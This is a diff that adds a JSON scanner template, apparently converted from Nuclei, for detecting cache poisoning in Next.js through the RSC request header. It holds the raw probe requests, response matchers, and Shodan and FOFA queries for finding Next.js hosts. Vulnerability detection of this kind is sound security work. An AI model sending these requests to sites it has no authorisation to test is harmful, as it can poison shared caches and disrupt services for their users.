@@ -1,0 +1,133 @@
+{
+  "id": "nextjs-rsc-cache",
+  "name": "Next.js - Cache Poisoning",
+  "author": "DhiyaneshDk",
+  "severity": "HIGH",
+  "description": "Next.js is vulnerable to Cache Poisoning using RSC.\n",
+  "references": [
+    "https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole"
+  ],
+  "tags": [
+    "nextjs",
+    "cache"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"/_next/static\"",
+    "shodan": "http.html:\"/_next/static\" cpe:\"cpe:2.3:a:zeit:next.js\""
+  },
+  "variables": {
+    "rand": [
+      "{{rand_text_numeric(5)}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /?cb\u003d{{rand}} HTTP/1.1\nHost: {{Hostname}}\nPriority: u\u003d1\nRsc: 1\n",
+        "@timeout: 10s\nGET /?cb\u003d{{rand}} HTTP/1.1\nHost: {{Hostname}}\nPriority: u\u003d1\nRsc: 1\n",
+        "@timeout: 10s\nGET /?cb\u003d{{rand}} HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_2 \u003d\u003d 200 \u0026\u0026 contains(content_type_2, \u0027text/x-component\u0027) \u0026\u0026 !contains(cache_control_2, \u0027no-cache\u0027) \u0026\u0026 !contains(pragma_2, \u0027no-cache\u0027)",
+            "status_code_3 \u003d\u003d 200 \u0026\u0026 contains(content_type_3, \u0027text/x-component\u0027) \u0026\u0026 !contains(cache_control_3, \u0027no-cache\u0027) \u0026\u0026 !contains(pragma_3, \u0027no-cache\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "nextjs-rsc-cache",
+    "info": {
+      "name": "Next.js - Cache Poisoning",
+      "author": "DhiyaneshDk",
+      "severity": "high",
+      "description": "Next.js is vulnerable to Cache Poisoning using RSC.\n",
+      "reference": [
+        "https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole"
+      ],
+      "metadata": {
+        "max_request": 0,
+        "shodan_query": [
+          "http.html:\"/_next/static\"",
+          "cpe:\"cpe:2.3:a:zeit:next.js\""
+        ],
+        "fofa_query": "body\u003d\"/_next/static\""
+      },
+      "tags": "nextjs,cache"
+    },
+    "variables": {
+      "rand": "{{rand_text_numeric(5)}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /?cb\u003d{{rand}} HTTP/1.1\nHost: {{Hostname}}\nPriority: u\u003d1\nRsc: 1\n",
+          "@timeout: 10s\nGET /?cb\u003d{{rand}} HTTP/1.1\nHost: {{Hostname}}\nPriority: u\u003d1\nRsc: 1\n",
+          "@timeout: 10s\nGET /?cb\u003d{{rand}} HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_2 \u003d\u003d 200 \u0026\u0026 contains(content_type_2, \u0027text/x-component\u0027) \u0026\u0026 !contains(cache_control_2, \u0027no-cache\u0027) \u0026\u0026 !contains(pragma_2, \u0027no-cache\u0027)",
+              "status_code_3 \u003d\u003d 200 \u0026\u0026 contains(content_type_3, \u0027text/x-component\u0027) \u0026\u0026 !contains(cache_control_3, \u0027no-cache\u0027) \u0026\u0026 !contains(pragma_3, \u0027no-cache\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
